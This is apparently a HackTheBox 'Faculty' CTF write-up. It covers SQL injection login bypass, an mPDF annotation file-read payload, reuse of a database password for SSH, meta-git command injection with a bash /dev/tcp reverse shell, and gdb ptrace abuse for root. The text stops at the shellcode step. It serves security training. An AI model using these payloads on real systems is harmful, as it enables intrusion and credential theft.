---
title: HTB: Faculty
url: https://0xdf.gitlab.io/2022/10/22/htb-faculty.html
date: 2022-10-22T13:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: htb-faculty, ctf, hackthebox, nmap, php, feroxbuster, sqli, sqli-bypass, auth-bypass, sqlmap, mpdf, cyberchef, burp, burp-repeater, file-read, password-reuse, credentials, meta-git, command-injection, gdb, ptrace, capabilities, python, msfvenom, shellcode
---

![Faculty](https://0xdfimages.gitlab.io/img/faculty-cover.png)

Faculty starts with a very buggy school management web application. I’ll abuse SQL injection to bypass authentication, and then a mPDF vulenrability to read files from disk. I’ll find a password for the database connection in the web files that is also used for a user account on the box. Next I’ll abuse meta-git to get a shell as the next user. The final user has access to the GNU debugger with ptrace capabilities. This allows me to connect to any process on the box and inject shellcode, getting execution in the context of that process. I’ll abuse a process running as root to get root access.

## Box Info

| Name | [Faculty](https://hackthebox.com/machines/faculty)  [Faculty](https://hackthebox.com/machines/faculty) [Play on HackTheBox](https://hackthebox.com/machines/faculty) |
| --- | --- |
| Release Date | [02 Jul 2022](https://twitter.com/hackthebox_eu/status/1582740868833878021) |
| Retire Date | 22 Oct 2022 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Faculty |
| Radar Graph | Radar chart for Faculty |
| First Blood User | 01:03:47[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| First Blood Root | 01:23:23[InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045) |
| Creator | [gbyolo gbyolo](https://app.hackthebox.com/users/36994) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.169
Starting Nmap 7.80 ( https://nmap.org ) at 2022-06-21 21:08 UTC
Nmap scan report for 10.10.11.169
Host is up (0.11s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 9.12 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.169
Starting Nmap 7.80 ( https://nmap.org ) at 2022-06-21 21:12 UTC
Nmap scan report for 10.10.11.169
Host is up (0.092s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://faculty.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.02 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 20.04 focal.

There’s a redirect on port 80 to `faculty.htb`. I’ll run a fuzz for interesting subdomains, but not find anything.

### Website - TCP 80

#### Site

Visiting the site by IP redirects to `faculty.htb` which redirects to `faculty.htb/login.php`, and presents a form:

![image-20220621173327212](https://0xdfimages.gitlab.io/img/image-20220621173327212.png)

Guessing random IDs doesn’t work:

![image-20220621203126041](https://0xdfimages.gitlab.io/img/image-20220621203126041.png)

Some Googling finds this application source [here](https://www.sourcecodester.com/php/14535/school-faculty-scheduling-system-using-phpmysqli-source-code.html), and there’s source I could use, but I won’t need it.

#### Tech Stack

The site is clearly running on PHP based on the source and the file extensions. The HTTP headers don’t give much more information.

Both login POST requests go to `/admin/ajax.php`. The faculty login has the GET parameter `action=login_faculty` and the admin login has `action=login`. It looks like this app is using one PHP file to handle all AJAX (JavaScript) requests.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```

oxdf@hacky$ feroxbuster -u http://faculty.htb -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://faculty.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        7l       12w      178c http://faculty.htb/admin => http://faculty.htb/admin/
302      GET      359l      693w        0c http://faculty.htb/ => login.php
200      GET      132l      235w        0c http://faculty.htb/login.php
500      GET        0l        0w        0c http://faculty.htb/test.php
200      GET      175l      311w        0c http://faculty.htb/admin/login.php
...[snip]...
301      GET        7l       12w      178c http://faculty.htb/mpdf => http://faculty.htb/mpdf/
...[snip]...
[####################] - 4m   1020000/1020000 0s      found:65      errors:449    
[####################] - 1m     60000/60000   537/s   http://faculty.htb 
[####################] - 1m     60000/60000   538/s   http://faculty.htb/admin 
[####################] - 1m     60000/60000   538/s   http://faculty.htb/admin/assets 
[####################] - 1m     60000/60000   538/s   http://faculty.htb/admin/database 
[####################] - 1m     60000/60000   538/s   http://faculty.htb/admin/assets/js 
[####################] - 1m     60000/60000   538/s   http://faculty.htb/admin/assets/img 
[####################] - 1m     60000/60000   537/s   http://faculty.htb/admin/assets/css 
[####################] - 1m     60000/60000   538/s   http://faculty.htb/admin/assets/uploads 
[####################] - 1m     60000/60000   537/s   http://faculty.htb/admin/assets/vendor 
[####################] - 2m     60000/60000   488/s   http://faculty.htb/mpdf 
[####################] - 2m     60000/60000   486/s   http://faculty.htb/mpdf/includes 
[####################] - 2m     60000/60000   486/s   http://faculty.htb/mpdf/tmp 
[####################] - 2m     60000/60000   487/s   http://faculty.htb/mpdf/classes 
[####################] - 2m     60000/60000   487/s   http://faculty.htb/mpdf/font 
[####################] - 2m     60000/60000   491/s   http://faculty.htb/mpdf/patterns 
[####################] - 2m     60000/60000   492/s   http://faculty.htb/mpdf/qrcode 
[####################] - 2m     60000/60000   492/s   http://faculty.htb/mpdf/qrcode/data 

```

There’s a lot of stuff there, most of which turns out to be not that interesting. There are two bits that may turn out to be interesting:
- Another login page at `/admin/login.php`. This presents another login for, this time with username and password:

  ![image-20220621203414165](https://0xdfimages.gitlab.io/img/image-20220621203414165.png)

</picture>
- The `mpdf` directory. [mPDF](https://mpdf.github.io/) is a PHP library for generating PDFs from HTML.

## Shell as gbyolo

### SQL Injection

#### Faculty Login Bypass

I’ll try a simple login bypass at the form at `/login.php`. Submitting `' or 1=1;-- -` works:

![image-20220621203655851](https://0xdfimages.gitlab.io/img/image-20220621203655851.png)

It logs in as John C Smith, which is likely the top user returned from the injected query. There’s not much interesting I can do from within here.

#### Admin Login Bypass

From the login form at `/admin/login.php`, I’ll try a username of `' or 1=1;-- -` and any password, and it logs in as well as the administrator user:

![image-20220621203908417](https://0xdfimages.gitlab.io/img/image-20220621203908417.png)

The “Course List” shows the current courses, as well as provides an interface to edit and delete them:

![image-20220621204245831](https://0xdfimages.gitlab.io/img/image-20220621204245831.png)

“Subject List” is a very similar interface. “Faculty List” has three users:

![image-20220621204321786](https://0xdfimages.gitlab.io/img/image-20220621204321786.png)

“Schedule” shows a calendar, and “Users” shows the admin user.

#### SQLI Rabbit Hole

Given the SQL injections in both login pages, I can go into burp and find either POST request, right click, and “Copy to file”. Then I can point `sqlmap` at that request, and it will find time-based blind injections:

```

oxdf@hacky$ sqlmap -r adminlogin.request --batch
...[snip]...
sqlmap identified the following injection point(s) with a total of 99 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 5442 FROM (SELECT(SLEEP(5)))nXZl) AND 'AcMf'='AcMf&password=admin
---
[01:31:07] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
...[snip]...
oxdf@hacky$ sqlmap -r login.request --batch
...[snip]...
sqlmap identified the following injection point(s) with a total of 248 HTTP(s) requests:
---
Parameter: id_no (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id_no=3' AND (SELECT 7066 FROM (SELECT(SLEEP(5)))BdCc) AND 'LTul'='LTul
---
[01:38:58] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12

```

With these, I can dump the database associated with with the scheduling application. But there’s nothing really interesting to find here. I also can’t read files from the disk or write files.

### Local File Read

#### PDF Generation

Many of the pages have a button to download the current info as a PDF. For example, on “Course List”:

![image-20220622053511516](https://0xdfimages.gitlab.io/img/image-20220622053511516.png)

Clicking on it redirects to a URL like `http://faculty.htb/mpdf/tmp/OKMLDkBmRPcCFe4AEb21xgzZYI.pdf` which presents a PDF:

![image-20220622053735176](https://0xdfimages.gitlab.io/img/image-20220622053735176.png)

Looking at the metadata about the PDF (in Firefox click `>>` > “Document Properties”), it shows the “PDF Producer” as mPDF 6.0:

![image-20220622054311030](https://0xdfimages.gitlab.io/img/image-20220622054311030.png)

That matches with what I noticed earlier with `feroxbuster`.

#### HTTP Requests / Responses

On clicking the PDF button, there’s a POST request to `/admin/download.php`:

```

POST /admin/download.php HTTP/1.1
Host: faculty.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 2612
Origin: http://faculty.htb
Connection: close
Referer: http://faculty.htb/admin/index.php?page=courses
Cookie: PHPSESSID=kqqn3uld2as77u1mpil4ckv6tk

pdf=JTI1M0NoMSUyNTNFJTI1M0NhJTJCbmFtZSUyNTNEJTI1MjJ0b3AlMjUyMiUyNTNFJTI1M0MlMjUyRmElMjUzRWZhY3VsdHkuaHRiJTI1M0MlMjUyRmgxJTI1M0UlMjUzQ2gyJTI1M0VDb3Vyc2VzJTI1M0MlMjUyRmgyJTI1M0UlMjUzQ3RhYmxlJTI1M0UlMjUwOSUyNTNDdGhlYWQlMjUzRSUyNTA5JTI1MDklMjUzQ3RyJTI1M0UlMjUwOSUyNTA5JTI1MDklMjUzQ3RoJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFJTI1MjMlMjUzQyUyNTJGdGglMjUzRSUyNTA5JTI1MDklMjUwOSUyNTNDdGglMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0VDb3Vyc2UlMjUzQyUyNTJGdGglMjUzRSUyNTA5JTI1MDklMjUwOSUyNTNDdGglMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0VEZXNjcmlwdGlvbiUyNTNDJTI1MkZ0aCUyNTNFJTI1MDklMjUwOSUyNTA5JTI1M0MlMjUyRnRyJTI1M0UlMjUzQyUyNTJGdGhlYWQlMjUzRSUyNTNDdGJvZHklMjUzRSUyNTNDdHIlMjUzRSUyNTNDdGQlMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0UxJTI1M0MlMjUyRnRkJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFJTI1M0NiJTI1M0VJbmZvcm1hdGlvbiUyQlRlY2hub2xvZ3klMjUzQyUyNTJGYiUyNTNFJTI1M0MlMjUyRnRkJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFJTI1M0NzbWFsbCUyNTNFJTI1M0NiJTI1M0VJVCUyNTNDJTI1MkZiJTI1M0UlMjUzQyUyNTJGc21hbGwlMjUzRSUyNTNDJTI1MkZ0ZCUyNTNFJTI1M0MlMjUyRnRyJTI1M0UlMjUzQ3RyJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFMiUyNTNDJTI1MkZ0ZCUyNTNFJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRSUyNTNDYiUyNTNFQlNDUyUyNTNDJTI1MkZiJTI1M0UlMjUzQyUyNTJGdGQlMjUzRSUyNTNDdGQlMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0UlMjUzQ3NtYWxsJTI1M0UlMjUzQ2IlMjUzRUJhY2hlbG9yJTJCb2YlMkJTY2llbmNlJTJCaW4lMkJDb21wdXRlciUyQlNjaWVuY2UlMjUzQyUyNTJGYiUyNTNFJTI1M0MlMjUyRnNtYWxsJTI1M0UlMjUzQyUyNTJGdGQlMjUzRSUyNTNDJTI1MkZ0ciUyNTNFJTI1M0N0ciUyNTNFJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRTMlMjUzQyUyNTJGdGQlMjUzRSUyNTNDdGQlMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0UlMjUzQ2IlMjUzRUJTSVMlMjUzQyUyNTJGYiUyNTNFJTI1M0MlMjUyRnRkJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFJTI1M0NzbWFsbCUyNTNFJTI1M0NiJTI1M0VCYWNoZWxvciUyQm9mJTJCU2NpZW5jZSUyQmluJTJCSW5mb3JtYXRpb24lMkJTeXN0ZW1zJTI1M0MlMjUyRmIlMjUzRSUyNTNDJTI1MkZzbWFsbCUyNTNFJTI1M0MlMjUyRnRkJTI1M0UlMjUzQyUyNTJGdHIlMjUzRSUyNTNDdHIlMjUzRSUyNTNDdGQlMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0U0JTI1M0MlMjUyRnRkJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFJTI1M0NiJTI1M0VCU0VEJTI1M0MlMjUyRmIlMjUzRSUyNTNDJTI1MkZ0ZCUyNTNFJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRSUyNTNDc21hbGwlMjUzRSUyNTNDYiUyNTNFQmFjaGVsb3IlMkJpbiUyQlNlY29uZGFyeSUyQkVkdWNhdGlvbiUyNTNDJTI1MkZiJTI1M0UlMjUzQyUyNTJGc21hbGwlMjUzRSUyNTNDJTI1MkZ0ZCUyNTNFJTI1M0MlMjUyRnRyJTI1M0UlMjUzQyUyNTJGdGJvYnklMjUzRSUyNTNDJTI1MkZ0YWJsZSUyNTNF

```

The response includes the new PDF name:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 22 Jun 2022 09:38:45 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 47

OKTMpikfngL1WQcv7ZzAwFa6VD.pdf

```

Then there’s a GET request to `/mpdf/tmp/OKTMpikfngL1WQcv7ZzAwFa6VD.pdf`.

The big blob of base64 in the original POST request is HTML that’s double URL encoded and then base64-encoded, which I can figure out by decoding it in [CyberChef](https://gchq.github.io/CyberChef/):

[![image-20220622054613195](https://0xdfimages.gitlab.io/img/image-20220622054613195.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220622054613195.png)

The result is HTML.

#### mPDF Exploit

There’s an [issue on the mPDF GitHub](https://github.com/mpdf/mpdf/issues/356) where the user h0ng10 points out that mPDF can be used to read files from the local system:

> During a security test I was able to inject HTML code into a PDF document that was
> generated by mPDF. By abusing the tag, it was possible to extract sensitive files/source code from the application backend.
>
> The following HTML example includes the file “/etc/passwd” into the generated PDF document.
>
> ```

> The PDF is dark and full of attachments  
>  <annotation file="/etc/passwd" content="/etc/passwd"  icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
>
> ```

>
> I recommend that the support for the tag should be disabled by default as many users don’t know of the possible impact that this feature can have.
>
> These are mPDF and PHP versions I am using
>
> mPDF 6.0

In the [mPDF changelog for version 7.0](https://github.com/mpdf/mpdf/blob/development/CHANGELOG.md#mpdf-700), they add a configuration that blocks this by default:

> Security: Embedded files via `<annotation>` custom tag must be explicitly allowed via `allowAnnotationFiles` configuration key

But given that Faculty is using 6.0, it is likely still vulnerable.

#### POC

I’ll take the POC from the GitHub issue and encode it, URL -> URL -> base64:

![image-20220622065828760](https://0xdfimages.gitlab.io/img/image-20220622065828760.png)

I’ll send the POST request to `/admin/download.php` to Repeater, and replace the `pdf` argument in the body with that encoded payload. On sending it, the page returns the PDF name:

![image-20220622070133001](https://0xdfimages.gitlab.io/img/image-20220622070133001.png)

Grabbing the PDF, it has the text from the payload:

![image-20220622070209863](https://0xdfimages.gitlab.io/img/image-20220622070209863.png)

Clicking on the paperclip shows it has an attachment named `passwd`:

![image-20220622070232422](https://0xdfimages.gitlab.io/img/image-20220622070232422.png)

Clicking on that downloads the `/etc/passwd` file from Faculty:

```

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...[snip]...
gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
postfix:x:113:119::/var/spool/postfix:/usr/sbin/nologin
developer:x:1001:1002:,,,:/home/developer:/bin/bash
usbmux:x:114:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin

```

I’ll note the users on the box with shells and ids > 1000, gbyolo and developer.

### Filesystem Enumeration

#### ajax.php

Given that the login requests go to `admin/ajax.php`, I’ll download that. Because it’s in the same directory as `download.php`, I’ll just set the payload to get the filename:

```

The PDF is dark and full of attachments  
 <annotation file="ajax.php" content="ajax.php"  icon="Graph" title="Attached File: ajax" pos-x="195" />

```

After encoding and submitting this, the source is returned. It’s a giant switch statement to call different functions based on the `$action`:

![image-20221020115308352](https://0xdfimages.gitlab.io/img/image-20221020115308352.png)

I’ll need to check out `admin_class.php`.

#### admin\_class.php / db\_connect.php

This file starts off getting the connection to the database:

```

<?php
session_start();
ini_set('display_errors', 1);
Class Action {
	private $db;

	public function __construct() {
		ob_start();
   	include 'db_connect.php';
    
    $this->db = $conn;
	}
	function __destruct() {
	    $this->db->close();
	    ob_end_flush();
	}
...[snip]...

```

Right away I want to read `db_connect.php`, as it will likely have creds. It does:

```

<?php 

$conn= new mysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')or die("Could not connect to mysql".mysqli_error($con));

```

### SSH

`crackmapexec` is a great way to quickly check the password against all the users I know. The password works for the gbyolo user:

```

oxdf@hacky$ crackmapexec ssh faculty.htb -u users -p 'Co.met06aci.dly53ro.per' --continue-on-success
SSH         faculty.htb     22     faculty.htb      [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
SSH         faculty.htb     22     faculty.htb      [-] root:Co.met06aci.dly53ro.per Authentication failed.
SSH         faculty.htb     22     faculty.htb      [-] developer:Co.met06aci.dly53ro.per Authentication failed.
SSH         faculty.htb     22     faculty.htb      [+] gbyolo:Co.met06aci.dly53ro.pe

```

And it works to get a shell:

```

oxdf@hacky$ sshpass -p 'Co.met06aci.dly53ro.per' ssh gbyolo@faculty.htb
...[snip]...
gbyolo@faculty:~$ 

```

## Shell as developer

### Enumeration

#### Home Directories

gbyolo’s home directory is relatively empty:

```

gbyolo@faculty:~$ ls -la
total 36
drwxr-x--- 6 gbyolo gbyolo 4096 Jun 22 09:03 .
drwxr-xr-x 4 root   root   4096 Oct 24  2020 ..
lrwxrwxrwx 1 gbyolo gbyolo    9 Oct 23  2020 .bash_history -> /dev/null
-rw-r--r-- 1 gbyolo gbyolo  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 gbyolo gbyolo 3771 Feb 25  2020 .bashrc
drwx------ 2 gbyolo gbyolo 4096 Oct 17  2020 .cache
drwx------ 3 gbyolo gbyolo 4096 Nov 10  2020 .config
drwxrwxr-x 3 gbyolo gbyolo 4096 Jun 22 09:03 .local
-rw-r--r-- 1 gbyolo gbyolo  807 Feb 25  2020 .profile
drwx------ 2 gbyolo gbyolo 4096 Nov 10  2020 .ssh

```

Consistent with the `passwd` file, there’s another user with a home directory:

```

gbyolo@faculty:/home$ ls -l
total 8
drwxr-x--- 8 developer developer 4096 Jun 22 12:48 developer
drwxr-x--- 6 gbyolo    gbyolo    4096 Jun 22 09:03 gbyolo
gbyolo@faculty:/home$ ls developer/
ls: cannot open directory 'developer/': Permission denied

```

gbyolo can’t access it.

#### mail

It’s not necessary to find, but there is mail for gbyolo. It can be fetched with the `mail` command:

```

gbyolo@faculty:/home$ mail
"/var/mail/gbyolo": 1 message 1 unread
>U   1 developer@faculty. Tue Nov 10 15:03  16/623   Faculty group
? 1
Return-Path: <developer@faculty.htb>
X-Original-To: gbyolo@faculty.htb
Delivered-To: gbyolo@faculty.htb
Received: by faculty.htb (Postfix, from userid 1001)
        id 0399E26125A; Tue, 10 Nov 2020 15:03:02 +0100 (CET)
Subject: Faculty group
To: <gbyolo@faculty.htb>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20201110140302.0399E26125A@faculty.htb>
Date: Tue, 10 Nov 2020 15:03:02 +0100 (CET)
From: developer@faculty.htb
X-IMAPbase: 1605016995 2
Status: O
X-UID: 1

Hi gbyolo, you can now manage git repositories belonging to the faculty group. Please check and if you have troubles just let me know!\ndeveloper@faculty.htb

```

Or just read from `/var/mail/gbyolo`:

```

gbyolo@faculty:/var/mail$ cat gbyolo 
From developer@faculty.htb  Wed Jun 22 14:50:01 2022
Return-Path: <developer@faculty.htb>
X-Original-To: gbyolo@faculty.htb
Delivered-To: gbyolo@faculty.htb
Received: by faculty.htb (Postfix, from userid 1001)
        id EA207261861; Wed, 22 Jun 2022 14:50:01 +0200 (CEST)
Subject: Faculty group
To: <gbyolo@faculty.htb>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20220622125001.EA207261861@faculty.htb>
Date: Wed, 22 Jun 2022 14:50:01 +0200 (CEST)
From: developer@faculty.htb

Hi gbyolo, you can now manage git repositories belonging to the faculty group. Please check and if you have troubles just let me know!\ndeveloper@faculty.htb

```

It says that gbyolo can access git repos in the faculty group. developer is in the faculty group, but gbyolo isn’t:

```

gbyolo@faculty:/var/mail$ cat /etc/group | grep faculty
faculty:x:1003:developer

```

#### sudo

gbyolo is able to run a command as developer using `sudo`:

```

gbyolo@faculty:~$ sudo -l
[sudo] password for gbyolo: 
Matching Defaults entries for gbyolo on faculty:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User gbyolo may run the following commands on faculty:
    (developer) /usr/local/bin/meta-git

```

### meta-git

#### Background

`meta-git` is a command line [NodeJS tool](https://github.com/mateodelnorte/meta-git) for interacting with Git repos, an alternative to the standard `git` command.

[This HackerOne report](https://hackerone.com/reports/728040) shows how to get code execution (not actually RCE since it isn’t remote) via command injection in the `clone` arguments.

#### POC

To test this, I’ll work out of `/dev/shm` and try the POC from the report:

```

gbyolo@faculty:/dev/shm$ sudo -u developer meta-git clone '0xdf||touch 0xdf'
[sudo] password for gbyolo: 
meta git cloning into '0xdf||touch 0xdf' at 0xdf||touch 0xdf

0xdf||touch 0xdf:
fatal: repository '0xdf' does not exist
0xdf||touch 0xdf ✓
(node:7148) UnhandledPromiseRejectionWarning: Error: ENOENT: no such file or directory, chdir '/dev/shm/0xdf||touch 0xdf'
    at process.chdir (internal/process/main_thread_only.js:31:12)
    at exec (/usr/local/lib/node_modules/meta-git/bin/meta-git-clone:27:11)
    at execPromise.then.catch.errorMessage (/usr/local/lib/node_modules/meta-git/node_modules/meta-exec/index.js:104:22)
    at process._tickCallback (internal/process/next_tick.js:68:7)
    at Function.Module.runMain (internal/modules/cjs/loader.js:834:11)
    at startup (internal/bootstrap/node.js:283:19)
    at bootstrapNodeJSCore (internal/bootstrap/node.js:623:3)
(node:7148) UnhandledPromiseRejectionWarning: Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch(). (rejection id: 1)
(node:7148) [DEP0018] DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code.
gbyolo@faculty:/dev/shm$ ls -l
total 0
-rw-rw-r-- 1 developer developer 0 Jun 22 14:55 0xdf

```

The `meta-git` command fails, but `touch 0xdf` works, creating that file as `developer`.

#### user.txt

I can use this to read `user.txt` (guessing that it must be in `/home/developer`):

```

gbyolo@faculty:/dev/shm$ sudo -u developer meta-git clone '0xdf||cat /home/developer/user.txt > /dev/shm/.x'
meta git cloning into '0xdf||cat /home/developer/user.txt > /dev/shm/.x' at .x

.x:
fatal: destination path '0xdf' already exists and is not an empty directory.
cat: .x: input file is output file
.x: command 'git clone 0xdf||cat /home/developer/user.txt > /dev/shm/.x .x' exited with error: Error: Command failed: git clone 0xdf||cat /home/developer/user.txt > /dev/shm/.x .x
(node:7282) UnhandledPromiseRejectionWarning: Error: ENOTDIR: not a directory, chdir '/dev/shm/.x'
    at process.chdir (internal/process/main_thread_only.js:31:12)
    at exec (/usr/local/lib/node_modules/meta-git/bin/meta-git-clone:27:11)
    at execPromise.then.catch.errorMessage (/usr/local/lib/node_modules/meta-git/node_modules/meta-exec/index.js:104:22)
    at process._tickCallback (internal/process/next_tick.js:68:7)
    at Function.Module.runMain (internal/modules/cjs/loader.js:834:11)
    at startup (internal/bootstrap/node.js:283:19)
    at bootstrapNodeJSCore (internal/bootstrap/node.js:623:3)
(node:7282) UnhandledPromiseRejectionWarning: Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch(). (rejection id: 2)
(node:7282) [DEP0018] DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code.
gbyolo@faculty:/dev/shm$ ls -la
total 4
drwxrwxrwt  2 root      root        80 Jun 22 14:57 .
drwxr-xr-x 18 root      root      3920 Jun 22 12:59 ..
-rw-rw-r--  1 developer developer   33 Jun 22 14:57 .x
-rw-rw-r--  1 developer developer    0 Jun 22 14:55 0xdf
gbyolo@faculty:/dev/shm$ cat .x 
14b5ba4a************************

```

#### Shell

I’ll create a simple reverse shell script in `/dev/shm/shell.sh`:

```

#!/bin/bash

bash -i >& /dev/tcp/10.10.14.6/443 0>&1

```

Now running that with `meta-git`, it hangs:

```

gbyolo@faculty:/dev/shm$ sudo -u developer meta-git clone '0xdf||bash /dev/shm/shell.sh'
meta git cloning into '0xdf||bash /dev/shm/shell.sh' at shell.sh

shell.sh:
fatal: destination path '0xdf' already exists and is not an empty directory.

```

At `nc`, I get a shell:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.169 58758
uid=1001(developer) gid=1002(developer) groups=1002(developer),1001(debug),1003(faculty)

```

I can upgrade my shell, but there’s also an SSH key pair in `/developer/.ssh` which I can use to log in:

```

developer@faculty:~/.ssh$ ls -la
total 20
drwxr-xr-x 2 developer developer 4096 Jun 22 08:51 .
drwxr-x--- 8 developer developer 4096 Jun 22 12:48 ..
-rw-r--r-- 1 developer developer  571 Jun 22 08:51 authorized_keys
-rw------- 1 developer developer 2602 Jun 22 08:51 id_rsa
-rw-r--r-- 1 developer developer  571 Jun 22 08:51 id_rsa.pub

```

## Shell as root

### Enumeration

#### Find gdb

I already noted that developer is in the faculty group, but this account is also in the debug group:

```

developer@faculty:~$ id
uid=1001(developer) gid=1002(developer) groups=1002(developer),1001(debug),1003(faculty)

```

It’s always a good idea to look for files that developer can access that the previous user couldn’t, which means looking for files in each of these groups. For debug, there’s a single file:

```

developer@faculty:~$ find / -group debug 2>/dev/null
/usr/bin/gdb

```

#### gdb

It’s odd that `gdb` would be in a group like that, but it does fit the group name. The standard permissions don’t show anything special about it, other than only root and members of the debug group can run it:

```

developer@faculty:~$ ls -l /usr/bin/gdb
-rwxr-x--- 1 root debug 8440200 Dec  8  2021 /usr/bin/gdb

```

It doesn’t have any special additional permissions:

```

developer@faculty:~$ lsattr /usr/bin/gdb
--------------e----- /usr/bin/gdb

```

But it does have a capability assigned:

```

developer@faculty:~$ getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace+ep

```

### Abusing gdb

#### Background

`gdb`, the [GNU Project Debugger](https://www.sourceware.org/gdb/), is a tool made for debugging ELF executable files. It’s commonly used when reverse engineering executables to put break points and look at how the CPU is handling various bits of assembly code mid-execution. I use it all the time in reverse engineering challenges.

Linux [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html) are a way to give a certain binary on a Linux system permission to do some things typically reversed for root without proving full root access. `cap_sys_ptrace` gives the ability to:

> ```

> * Trace arbitrary processes using ptrace(2);
> * apply get_robust_list(2) to arbitrary processes;
> * transfer data to or from the memory of arbitrary
>   processes using process_vm_readv(2) and
>   process_vm_writev(2);
> * inspect processes using kcmp(2).
>
> ```

By putting these together, this `gdb` can attach to and debug any process on the system, including those running as root.

#### Shellcode

I’ll a few different tactics for shellcode, but I’ll have the most success with a simple bind shell payload like [this one](https://www.exploit-db.com/exploits/41128).

